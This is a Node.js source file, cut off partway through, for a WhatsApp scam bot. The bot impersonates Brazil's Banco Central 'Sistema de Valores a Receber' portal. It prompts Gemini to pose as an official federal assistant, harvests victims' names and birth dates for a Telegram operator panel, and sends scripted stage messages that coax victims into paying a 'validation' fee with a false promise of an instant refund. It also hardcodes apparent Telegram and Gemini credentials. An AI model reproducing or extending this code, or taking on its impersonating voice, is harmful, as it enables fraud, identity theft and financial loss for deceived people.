const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const QRCode = require('qrcode');
const FormData = require('form-data');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

// --- OBFUSCATION LAYER ---
const _d = (b) => Buffer.from(b, 'base64').toString('utf-8');

let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://www.consultarvaloresareceber.com.br').replace(/\/$/, "");

if (API_URL.includes("discloud.app")) {
    console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
    API_URL = "https://www.consultarvaloresareceber.com.br";
}

const API_HEADERS = {
    'User-Agent': 'SVR-BOT-NODE-RUNTIME/5.0 (ShardCloud-Environment)',
    'X-SVR-Bot-Token': '8643978397'
};

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "AIzaSyCe0RyNY95UPhE1woWTfsshjrZGtyFKAV8";

function mask(str) {
    if (!str) return "NÃO CONFIGURADO";
    return str.substring(0, 6) + "..." + str.substring(str.length - 4);
}

console.log(`\n🤖 [SVR BOT] SISTEMA OPERACIONAL`);
console.log(`---------------------------------------------`);
console.log(`📡 ENDPOINT: ${API_URL}`);
console.log(`🛡️ SEGURANÇA: ATIVA`);
console.log(`---------------------------------------------\n`);

// --- PROMPTS DE IA ---
// Prompt para mensagens espontâneas iniciais (antes do cadastro)
const PROMPT_INICIAL = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ) e da Lei Complementar nº 105/2001. 
Este canal é de uso exclusivo para liberação de ativos financeiros pendentes de titulares cadastrados no sistema federal.
Um cidadão entrou em contato. Responda de forma extremamente formal, institucional e segura, como um assistente de órgão público federal. 
Informe brevemente que identificou valores a receber cadastrados em nome do titular no sistema e que é necessário validar a identidade para prosseguir com a liberação. Não mencione valores específicos. Seja sóbrio, preciso e formal.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**), pois o WhatsApp não reconhece e polui a mensagem.

Mensagem do cidadão:`;

// Prompt para validação de data inválida
const PROMPT_DATA_INVALIDA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
O cidadão enviou uma mensagem que não corresponde a uma data de nascimento válida. Solicite novamente de forma formal e institucional, no formato DD/MM/AAAA.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).

Mensagem do cidadão:`;

// Prompt para validação de nome inválido
const PROMPT_NOME_INVALIDO = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
O cidadão enviou algo que não parece ser um nome completo válido. Solicite que informe o nome completo conforme consta em documento oficial, de forma formal e institucional.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).

Mensagem do cidadão:`;

// Prompt para mensagens durante a fila de espera
const PROMPT_FILA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ).
O cidadão está aguardando na fila de processamento para liberação de seus ativos financeiros. O registro dele já foi validado com sucesso e está em análise pelos sistemas do Banco Central.
Responda de forma formal, institucional e tranquilizadora, informando que o processo está em andamento e que ele será notificado assim que a liberação for processada. Solicite que aguarde. Não mencione valores. Seja sóbrio e oficial.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**), pois o WhatsApp não reconhece e polui a mensagem.

Mensagem do cidadão durante a espera:`;

async function askAI(prompt, userMessage) {
    if (!GEMINI_KEY) return null;
    try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
        const response = await axios.post(url, {
            contents: [{ parts: [{ text: `${prompt}\n\n"${userMessage}"` }] }]
        });
        return response.data.candidates[0].content.parts[0].text || null;
    } catch (e) {
        console.error('❌ [IA] Erro ao chamar Gemini:', e.message);
        return null;
    }
}

// --- SESSÕES ---
let chatSessions = new Map();
const SESSIONS_FILE = path.join(process.cwd(), 'sessions.json');

// --- LOCK DE PROCESSAMENTO POR LEAD ---
// Evita que duas mensagens simultâneas do mesmo lead causem respostas duplicadas
const processingLock = new Set();

function loadSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf-8'));
            chatSessions = new Map(Object.entries(data));
            console.log(`📂 [SESSÕES] ${chatSessions.size} sessão(ões) restaurada(s).`);
        }
    } catch (e) { console.error('Erro ao carregar sessões:', e.message); }
}

function saveSessions() {
    try {
        const obj = Object.fromEntries(chatSessions);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2));
    } catch (e) { console.error('Erro ao salvar sessões:', e.message); }
}

loadSessions();

// --- FILA DE ESPERA ---
// Guarda leads que já concluíram o cadastro e aguardam liberação manual
let waitingQueue = [];
const QUEUE_FILE = path.join(process.cwd(), 'waiting-queue.json');

function loadQueue() {
    try {
        if (fs.existsSync(QUEUE_FILE)) {
            waitingQueue = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf-8'));
            console.log(`📂 [FILA] ${waitingQueue.length} lead(s) na fila restaurado(s).`);
        }
    } catch (e) { console.error('Erro ao carregar fila:', e.message); }
}

function saveQueue() {
    try {
        fs.writeFileSync(QUEUE_FILE, JSON.stringify(waitingQueue, null, 2));
    } catch (e) { console.error('Erro ao salvar fila:', e.message); }
}

function addToQueue(chatId, name, birthDate) {
    // Evita duplicatas
    if (!waitingQueue.find(q => q.chatId === chatId)) {
        waitingQueue.push({ chatId, name, birthDate, joinedAt: Date.now() });
        saveQueue();
    }
}

function getQueuePosition(chatId) {
    const idx = waitingQueue.findIndex(q => q.chatId === chatId);
    return idx >= 0 ? idx + 1 : null;
}

function removeFromQueue(chatId) {
    waitingQueue = waitingQueue.filter(q => q.chatId !== chatId);
    saveQueue();
}

loadQueue();

// --- TELEGRAM ---
async function notifyTelegram(html, messageId, replyMarkup) {
    if (!TG_TOKEN || !CHAT_ID) return null;
    try {
        if (messageId) {
            const payload = { chat_id: CHAT_ID, message_id: messageId, text: html, parse_mode: 'HTML' };
            if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, payload);
            return res.data.result?.message_id || messageId;
        } else {
            const payload = { chat_id: CHAT_ID, text: html, parse_mode: 'HTML' };
            if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, payload);
            return res.data.result?.message_id || null;
        }
    } catch (e) {
        console.error('❌ [TELEGRAM] Falha ao notificar:', e.message);
        return null;
    }
}

async function notifyTelegramPhoto(buffer, caption) {
    if (!TG_TOKEN || !CHAT_ID) return null;
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'media.png', contentType: 'image/png' });
        form.append('caption', caption, { contentType: 'text/plain' });
        form.append('parse_mode', 'HTML');

        const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            timeout: 20000
        });
        return res.data.result?.message_id || null;
    } catch (e) {
        console.error('❌ [TELEGRAM] Erro ao enviar foto:', e.message);
        return null;
    }
}

// Monta o texto do painel de cadastro no Telegram (editável)
function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF') {
    const statusEmoji = {
        'preenchendo_data': '⏳',
        'preenchendo_nome': '⏳',
        'validado': '✅',
        'na_fila': '🕐'
    }[status] || '⏳';

    const nomeDisplay = nome ? `✅ <b>${nome}</b>` : `<i>⏳ Preenchendo...</i>`;
    const dataDisplay = dataNasc ? `✅ <b>${dataNasc}</b>` : `<i>⏳ Preenchendo...</i>`;

    let statusMsg = '';
    if (status === 'preenchendo_data') statusMsg = '📝 <i>Aguardando data de nascimento...</i>';
    else if (status === 'preenchendo_nome') statusMsg = '📝 <i>Aguardando nome completo...</i>';
    else if (status === 'validado') statusMsg = '✅ <b>CADASTRO CONCLUÍDO — Enviado para a fila!</b>';
    else if (status === 'na_fila') {
        const pos = getQueuePosition(chatId);
        statusMsg = pos ? `🕐 <b>Na fila — Posição: ${pos}º</b>` : `🕐 <b>Na fila de processamento</b>`;
    }

    const tipoLabel = tipo === 'CNPJ' ? '🏢 Pessoa Jurídica (CNPJ)' : '👤 Pessoa Física (CPF)';
    const dataLabel = tipo === 'CNPJ' ? 'Data de Abertura' : 'Data de Nascimento';
    const nomeLabel = tipo === 'CNPJ' ? 'Razão Social' : 'Nome Completo';

    return `${statusEmoji} <b>NOVO CADASTRO EM ANDAMENTO</b>\n\n` +
        `👤 <b>Lead:</b> <code>${chatId}</code>\n` +
        `📄 <b>Tipo:</b> ${tipoLabel}\n\n` +
        `📋 <b>Dados do Titular:</b>\n` +
        `• ${dataLabel}: ${dataDisplay}\n` +
        `• ${nomeLabel}: ${nomeDisplay}\n\n` +
        `📊 <b>Status:</b> ${statusMsg}`;
}

// --- CLIENTE WHATSAPP ---
const botIdArg = process.argv.find(a => a.startsWith('--id='));
const BOT_ID = botIdArg ? botIdArg.split('=')[1] : 'main';
const STATUS_FILE = `bot-status-${BOT_ID}.json`;

console.log(`🤖 [BOT] Iniciando instância: ${BOT_ID} | Status: ${STATUS_FILE}`);

const client = new Client({
    authStrategy: new LocalAuth({ clientId: BOT_ID, dataPath: '.wwebjs_auth' }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    }
});

client.on('qr', async (qr) => {
    console.log('\n📱 [QR CODE] Escaneie com o WhatsApp:\n');
    qrcode.generate(qr, { small: true });
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'WAITING_QR', qr, ts: Date.now() }));

    try {
        const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
        const qrBuffer = await QRCode.toBuffer(qr, { width: 512, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', qrBuffer, { filename: 'qrcode.png', contentType: 'image/png' });
        form.append('caption', `📲 <b>QR CODE — ${slotLabel}</b>\n\nEscaneie com o WhatsApp para conectar o bot.\n\n⏳ Aguardando leitura...`, { contentType: 'text/plain' });
        form.append('parse_mode', 'HTML');

        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            timeout: 15000
        });
        console.log('✅ [TELEGRAM] QR Code enviado com sucesso!');
    } catch (e) {
        console.error('❌ [TELEGRAM] Erro ao enviar QR Code como imagem:', e.message);
        await notifyTelegram(`📱 <b>QR CODE GERADO</b>\nNão foi possível enviar a imagem. Verifique os logs do servidor.`);
    }
});

client.on('ready', async () => {
    console.log('✅ [BOT] WhatsApp conectado e pronto!');
    let adminName = BOT_ID === 'main' ? 'Perfil 1' : BOT_ID;
    try {
        const info = client.info;
        if (info && info.pushname) adminName = info.pushname;
    } catch(e) {}
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'CONNECTED', adminName, ts: Date.now() }));
    const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
    notifyTelegram(`✅ <b>${slotLabel} CONECTADO</b>\n\n📱 WhatsApp vinculado com sucesso!\nO bot está pronto para atendimento.`);
});

client.on('disconnected', (reason) => {
    console.log('⚠️ [BOT] Desconectado:', reason);
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'DISCONNECTED', reason, ts: Date.now() }));
});

// =============================================================
// HANDLER 1: 'message_create' — SOMENTE para detectar quando o
// admin digita manualmente e assume o atendimento de um lead.
// NÃO processa mensagens recebidas aqui para evitar confusão.
// =============================================================

// Mensagem formal enviada automaticamente quando o operador assume
const MENSAGEM_OPERADOR_ASSUME = `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
*Departamento de Liberação de Ativos Financeiros*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal SVR, vinculado ao Banco Central do Brasil, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.

Seu processo de liberação de ativos financeiros pendentes encontra-se devidamente registrado em nosso sistema federal e aguarda a conclusão das etapas obrigatórias de validação, conforme previsto na legislação vigente.

📋 *ETAPAS OBRIGATÓRIAS PARA LIBERAÇÃO:*

*1ª Etapa — Autenticação de Identidade:* ✅ Concluída
Validação dos dados cadastrais do titular perante os registros do Banco Central do Brasil.

*2ª Etapa — Validação Jurídica do Processo:* 🔄 Em andamento
Análise e homologação do pedido de resgate junto ao Departamento de Ativos Não Reclamados.

*3ª Etapa — Confirmação do Canal de Recebimento:* ⏳ Pendente
Verificação e habilitação da conta de destino para transferência dos valores resgatados.

*4ª Etapa — Liberação e Transferência dos Valores:* ⏳ Pendente
Processamento final e crédito dos ativos financeiros na conta indicada pelo titular.

⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no retorno dos valores ao Fundo Garantidor.

Nosso operador responsável conduzirá o(a) senhor(a) pelas próximas etapas de forma segura, sigilosa e dentro dos prazos legalmente estabelecidos.

_Contamos com sua colaboração e compreensão._

*Portal SVR — Banco Central do Brasil*
*CNPJ: 00.038.166/0001-05*
_Este canal é monitorado e possui validade jurídica._`;

// --- MENSAGENS POR ETAPA ---
const MENSAGEM_ETAPA_2_CONCLUIDA =
`🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
*Departamento de Liberação de Ativos Financeiros*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

✅ *A Validação Jurídica do seu processo foi concluída com êxito.*

Nosso operador especializado confirmou a titularidade e a autenticidade dos seus dados perante o Departamento de Ativos Não Reclamados do Banco Central do Brasil.

📋 *STATUS ATUALIZADO DAS ETAPAS:*

✅ 1ª Etapa — Autenticação de Identidade: *CONCLUÍDA*
✅ 2ª Etapa — Validação Jurídica do Processo: *CONCLUÍDA*
⏳ 3ª Etapa — Confirmação do Canal de Recebimento: *PENDENTE*
⏳ 4ª Etapa — Liberação e Transferência dos Valores: *PENDENTE*

Nosso operador dará continuidade ao processo em instantes. Permaneça disponível.

*Portal SVR — Banco Central do Brasil*
_Este processo possui registro jurídico e validade legal._`;

const MENSAGEM_ETAPA_3 =
`🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*
*Departamento de Segurança Financeira — Portal SVR*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Para garantir a integridade da transferência dos seus ativos, o sistema exige a realização de um procedimento de *Validação de Vínculo Bancário*. 

⚠️ *ESCLARECIMENTO:* Este procedimento *NÃO* é uma transação comercial, mas sim uma autenticação obrigatória da conta bancária que irá receber os valores. O protocolo gera um *Vínculo de Segurança* entre o Banco Central e sua conta.

📋 *DADOS DO PROTOCOLO DE VALIDAÇÃO:*

🔹 *Protocolo:* #VAL-SVR-CONFIRM
🔹 *Validade:* 15 Minutos (Expirável)
🔹 *Finalidade:* Habilitação de canal para recebimento de ativos.

✅ *REEMBOLSO IMEDIATO:* Assim que a validação for processada pelo sistema, o valor utilizado para autenticação será *ESTORNADO INSTANTANEAMENTE* para sua conta, somado ao valor total dos seus ativos recuperados.

O sistema processará o estorno de forma automática via PIX em até 60 segundos após a confirmação do protocolo.

Aguarde o envio das instruções de validação (Código Hash de Autenticação).

*Portal SVR — Banco Central do Brasil*
_Processo regido pela Resolução BCB nº 318/2023._`;

const MENSAGEM_ETAPA_4 =
`🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*
*Departamento de Rastreamento de Ativos — SVR*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Informamos que o seu *Protocolo Privado de Segurança* foi gerado com êxito pelo sistema federal de ativos.

🖥️ *STATUS DO SISTEMA:*
\`\`\`
ID: #SVR-PROT-OK
STATUS: PRONTO_PARA_USO
TYPE: CHAVE_HASH_CRIPTOGRAFADA
VINCULO: ATIVO
\`\`\`

✅ O código enviado anteriormente representa o seu link de autenticação segura. Assim que a integração for detectada pela rede bancária, o processo avançará automaticamente para a fase de crédito final.

⚠️ *ATENÇÃO:* Permaneça nesta tela. O sistema está monitorando a validação do hash em tempo real. Assim que concluído, o montante total será liberado.

*Portal SVR — Banco Central do Brasil*`;

const MENSAGEM_ETAPA_5 =
`✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
*Departamento de Execução Financeira — Portal SVR*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ *PARABÉNS! SEU RESGATE FOI PROCESSADO COM SUCESSO.*

Prezado(a) Titular,

É com satisfação que informamos a conclusão do seu processo de recuperação de ativos financeiros. Todas as etapas de validação jurídica, vínculo bancário e homologação federal foram devidamente superadas.

💰 *STATUS DA TRANSFERÊNCIA:*
```
VALOR TOTAL: LIBERADO
ESTORNO TAXA: PROCESSADO
PRAZO: ATÉ 1 DIA ÚTIL
```

O montante total (Ativos + Reembolso do Protocolo) será creditado na conta informada em até *24 horas úteis*, conforme o fluxo de liquidação do Banco Central do Brasil.

O senhor(a) receberá uma notificação via SMS ou e-mail assim que o valor estiver disponível para uso.

*Agradecemos a sua confiança e colaboração.*
━━━━━━━━━━━━━━━━━━━━━━━━━━━
*Portal SVR — Banco Central do Brasil*
_Processo 100% Homologado e Finalizado._`;

const BANCOS_LIST = {
    "001": "Banco do Brasil", "003": "Banco da Amazônia", "004": "Banco do Nordeste", "007": "BNDES", "010": "Credicoamo",
    "011": "Credit Suisse HG", "012": "Banco Inbursa", "017": "Bny Mellon", "021": "Banestes", "024": "Banco Bandepe",
    "025": "Banco Alfa", "029": "Itaú Consignado", "033": "Santander", "036": "Bradesco BBI", "037": "Banpará",
    "041": "Banrisul", "047": "Banese", "060": "Confidence Corretora", "062": "Hipercard", "063": "Bradescard",
    "064": "Goldman Sachs", "065": "Banco Andbank", "066": "Morgan Stanley", "069": "Crefisa", "070": "BRB - Banco de Brasília",
    "074": "Banco J. Safra", "075": "Banco ABN AMRO", "076": "Banco KDB", "077": "Banco Inter", "078": "Haitong Banco",
    "079": "Banco Original Agro", "080": "B&T Corretora", "081": "Bancoseguro", "082": "Banco Topázio", "083": "Banco da China Brasil",
    "084": "Uniprime Norte PR", "085": "Ailos", "088": "Banco Randon", "089": "Credisan", "091": "Central RS",
    "092": "BRK S.A. Crédito", "094": "Banco Finaxis", "096": "Banco B3", "097": "Credisis", "098": "Credialiança",
    "099": "Uniprime Central", "100": "Planner Corretora", "101": "Renascença DTVM", "102": "XP Investimentos",
    "104": "Caixa Econômica Federal", "105": "Lecca Crédito", "107": "Banco Bocom BBM", "108": "Portocred S.A.", "111": "Oliveira Trust",
    "113": "Magliano S.A.", "114": "Cecoop", "117": "Advanced Corretora", "119": "Western Union", "120": "Banco Rodobens",
    "121": "Banco Agibank", "122": "Bradesco Berj", "124": "Woori Bank", "125": "Plural S.A.", "126": "BR Partners",
    "127": "Codepe Corretora", "128": "MS Bank", "129": "UBS Brasil", "130": "Caruana S.A.", "131": "Tullett Prebon",
    "132": "ICBC do Brasil", "133": "Cresol", "134": "BGC Liquidez", "136": "Unicred do Brasil", "138": "Get Money Corretora",
    "139": "Intesa Sanpaolo", "140": "Easynvest", "142": "Broker Brasil Corretora", "143": "Treviso Corretora", "144": "Bexs Banco",
    "145": "Levycam", "146": "Guitta Corretora", "149": "Facta Financeira", "157": "ICAP do Brasil", "159": "Casa do Crédito",
    "163": "Commerzbank Brasil", "169": "Banco Olé Consignado", "173": "BRL Trust", "174": "Pefisa S.A.", "177": "Guide Investimentos",
    "180": "CM Capital Markets", "183": "Socred S.A.", "184": "Banco Itaú BBA", "188": "Ativa Investimentos", "189": "HS Financeira",
    "191": "Nova Futura", "194": "Parmetal DTVM", "196": "Fair Corretora", "197": "Stone Pagamentos", "208": "Banco BTG Pactual",
    "212": "Banco Original", "213": "Banco Arbi", "217": "Banco John Deere", "218": "Banco BS2", "222": "Crédit Agricole",
    "224": "Banco Fibra", "233": "Banco Cetelem", "237": "Banco Bradesco", "241": "Banco Clássico", "243": "Banco Máxima",
    "246": "Banco ABC Brasil", "249": "Investcred Unibanco", "250": "BCV - Crédito e Varejo", "253": "Bexs Corretora", "254": "Paraná Banco",
    "259": "Moneycorp Banco", "260": "Nubank", "265": "Banco Fator", "266": "Banco Cédula", "268": "Bari Cia Hipotecária",
    "269": "Banco HSBC", "271": "IB Corretora", "272": "AGK Corretora", "274": "Money Plus", "278": "Genial Investimentos",
    "280": "Avista S.A.", "281": "Coopavel", "285": "Frente Corretora", "286": "Sulcredi/Ouro", "288": "Carol DTVM",
    "289": "Decyseo Corretora", "290": "PagBank", "292": "BS2 DTVM", "293": "Lastro RDV", "299": "Sorocred",
    "300": "Banco de la Nacion Argentina", "301": "BPP Pagamentos", "306": "QI Sociedade de Crédito", "309": "Cambionet Corretora",
    "313": "Amazônia Corretora", "315": "Pi DTVM", "318": "Banco BMG", "319": "OM DTVM", "320": "China Construction Bank",
    "321": "Crefaz", "323": "Mercado Pago", "324": "Cartos SCD", "325": "Órama DTVM", "326": "Parati - Crédito",
    "330": "Banco Bari", "331": "Fram Capital", "332": "Acesso Soluções", "335": "Banco Digio", "336": "Banco C6",
    "340": "Super Pagamentos", "341": "Itaú Unibanco", "342": "Creditas SCD", "348": "Banco XP", "349": "AL5 S.A. Crédito",
    "364": "Gerencianet (Efí)", "366": "Société Générale", "368": "Banco CSF (Carrefour)", "370": "Terra Investimentos", "376": "J.P. Morgan",
    "380": "PicPay", "381": "Mercedes-Benz", "389": "Banco Mercantil", "390": "Banco GM", "393": "Volkswagen",
    "394": "Bradesco Financiamentos", "396": "Hub Pagamentos", "397": "Listo SCD", "399": "Kirton Bank", "403": "Cora SCD",
    "404": "SumUp SCD", "408": "Bónuscred SCD", "412": "Banco Capital", "422": "Banco Safra", "456": "MUFG Brasil",
    "464": "Sumitomo Mitsui", "473": "Caixa Geral - Brasil", "477": "Citibank N.A.", "479": "Itaubank", "487": "Deutsche Bank",
    "488": "JPMorgan Chase", "492": "ING Bank N.V.", "495": "Banco de la Provincia", "505": "Credit Suisse Brasil", "600": "Banco Luso Brasileiro",
    "604": "Industrial do Brasil", "610": "Banco VR", "611": "Banco Paulista", "612": "Banco Guanabara", "613": "Omni Banco",
    "623": "Banco Pan", "626": "C6 Consignado", "630": "Smartbank", "633": "Banco Rendimento", "634": "Banco Triângulo",
    "637": "Banco Sofisa", "643": "Banco Pine", "652": "Itaú Holding", "653": "Banco Indusval", "654": "Banco Digimais",
    "655": "Banco Votorantim", "707": "Banco Daycoval", "712": "Banco Ourinvest", "739": "Banco Cetelem", "741": "Banco Ribeirão Preto",
    "743": "Banco Semear", "745": "Citibank S.A.", "746": "Banco Modal", "747": "Rabobank International", "748": "Sicredi",
    "751": "Scotiabank", "752": "BNP Paribas", "753": "Novo Banco Continental", "754": "Banco Sistema", "755": "BofA Merrill Lynch",
    "756": "Sicoob", "757": "Keb Hana do Brasil"
};

function detectBank(text) {
    const clean = text.toLowerCase();
    for (const [code, name] of Object.entries(BANCOS_LIST)) {
        if (clean.includes(code) || clean.includes(name.toLowerCase())) {
            return { code, name };
        }
    }
    return null;
}

client.on('message_create', async (msg) => {
    if (BOT_ID !== 'main') return;
    if (!msg.fromMe) return;

    const targetChatId = msg.to;
    if (!targetChatId) return;
    if (targetChatId.includes('@g.us')) return;

    const currentSession = chatSessions.get(targetChatId);

    // --- DETECÇÃO DE LIGAÇÃO ATENDIDA (Etapa 2 automática) ---
    if (msg.type === 'call_log') {
        if (currentSession && currentSession.mode === 'human' && currentSession.humanStep === 1) {
            const callBody = (msg.body || '').toLowerCase();
            // Verifica se a ligação foi atendida (não perdida)
            const callAnswered = !callBody.includes('perdida') && !callBody.includes('missed') && !callBody.includes('sem resposta');
            if (callAnswered) {
                currentSession.humanStep = 2;
                chatSessions.set(targetChatId, currentSession);
                saveSessions();
                console.log(`📞 [CALL] Ligação atendida por ${targetChatId} — Etapa 2 concluída automaticamente!`);

                // Notifica Telegram com botão para liberar Etapa 3
                await notifyTelegram(
                    `📞 <b>LIGAÇÃO ATENDIDA — ETAPA 2 CONCLUÍDA!</b>\n\nLead: <code>${targetChatId}</code>\nNome: <b>${currentSession.name || '?'}</b>\n\n<i>Clique abaixo quando quiser liberar a Etapa 3 ao lead.</i>`,
                    undefined,
                    { inline_keyboard: [[{ text: '📋 Liberar Etapa 3 ao Lead', callback_data: `etapa:3:${targetChatId}` }]] }
                );

                // Envia mensagem de Etapa 2 concluída ao lead
                setTimeout(async () => {
                    await client.sendMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA);
                }, 2000);
            } else {
                console.log(`📵 [CALL] Ligação perdida/não atendida por ${targetChatId}.`);
                await notifyTelegram(`📵 <b>LIGAÇÃO NÃO ATENDIDA</b>\nLead: <code>${targetChatId}</code>\n<i>Tente ligar novamente.</i>`);
            }
        }
        return;
    }

    // --- ADMIN DIGITA MANUALMENTE → ASSUME ATENDIMENTO ---
    if (!currentSession || currentSession.mode !== 'bot') return;

    const sessionAge = Date.now() - (currentSession.createdAt || Date.now());
    if (sessionAge > 30000) {
        // Preserva dados do lead ao assumir
        chatSessions.set(targetChatId, {
            mode: 'human',
            humanStep: 1,
            name: currentSession.name || null,
            birthDate: currentSession.birthDate || null,
            docType: currentSession.docType || 'CPF'
        });
        saveSessions();
        console.log(`👤 [ADMIN] Assumiu atendimento de: ${targetChatId}`);
        notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO PELO ADMIN</b>\nLead: <code>${targetChatId}</code>\nNome: <b>${currentSession.name || '?'}</b>\n\n<i>📞 Agora ligue para o lead. A Etapa 2 será concluída automaticamente quando ele atender.</i>`);

        setTimeout(async () => {
            try {
                await client.sendMessage(targetChatId, MENSAGEM_OPERADOR_ASSUME);
                console.log(`📨 [ADMIN] Mensagem formal enviada ao lead: ${targetChatId}`);
            } catch (e) {
                console.error(`❌ [ADMIN] Erro ao enviar mensagem formal:`, e.message);
            }
        }, 1500);
    }
});

// =============================================================
// HANDLER 2: 'message' — SOMENTE mensagens RECEBIDAS (incoming).
// Este evento NÃO dispara para mensagens que o bot envia,
// eliminando o risco de processar a própria resposta.
// =============================================================
client.on('message', async (msg) => {
    if (BOT_ID !== 'main') return;

    // msg.from = sempre o remetente (o lead). Nunca é o bot.
    const targetChatId = msg.from;
    if (!targetChatId) return;

    // Ignora mensagens de grupos (apenas individuais)
    if (targetChatId.includes('@g.us')) return;

    // LOCK: se já estamos processando uma mensagem deste lead, ignorar
    if (processingLock.has(targetChatId)) {
        console.log(`⏳ [LOCK] Mensagem de ${targetChatId} ignorada — já processando.`);
        return;
    }
    processingLock.add(targetChatId);

    try {
        await processIncomingMessage(msg, targetChatId);
    } catch (e) {
        console.error(`❌ [ERRO] Falha ao processar mensagem de ${targetChatId}:`, e.message);
    } finally {
        // Libera o lock após 2s para evitar spam mas permitir próximas mensagens
        setTimeout(() => processingLock.delete(targetChatId), 2000);
    }
});

// =============================================================
// FUNÇÃO PRINCIPAL DE PROCESSAMENTO DE MENSAGEM RECEBIDA
// Centraliza toda a lógica para evitar duplicação e facilitar
// a depuração do fluxo de cada lead individualmente.
// =============================================================
async function processIncomingMessage(msg, targetChatId) {
    const text = (msg.body || "").trim();
    const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');

    // Registra o último lead que enviou mensagem (para o comando /pix)
    fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));

    const currentSession = chatSessions.get(targetChatId);
    console.log(`📩 [MSG] De: ${targetChatId} | Sessão: ${currentSession?.mode || 'nova'} | Texto: "${text.substring(0, 60)}"`);

    // --- LEAD NA FILA DE ESPERA ---
    if (currentSession && currentSession.mode === 'waiting') {
        const pos = getQueuePosition(targetChatId);
        const chat = await msg.getChat();
        await chat.sendStateTyping();

        const aiReply = await askAI(PROMPT_FILA, text);
        const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
        const fallback = `📋 *Portal SVR — Sistema de Valores a Receber*\n\n` +
            `Prezado(a) titular,\n\n` +
            `Seus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\n` +
            `O processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\n` +
            `Agradecemos sua compreensão.\n_Portal SVR — Banco Central do Brasil_`;

        await client.sendMessage(targetChatId, aiReply || fallback);
        return;
    }

    // --- LEAD EM ATENDIMENTO HUMANO — bot silencioso (EXCETO ETAPA 5) ---
    if (currentSession && currentSession.mode === 'human') {
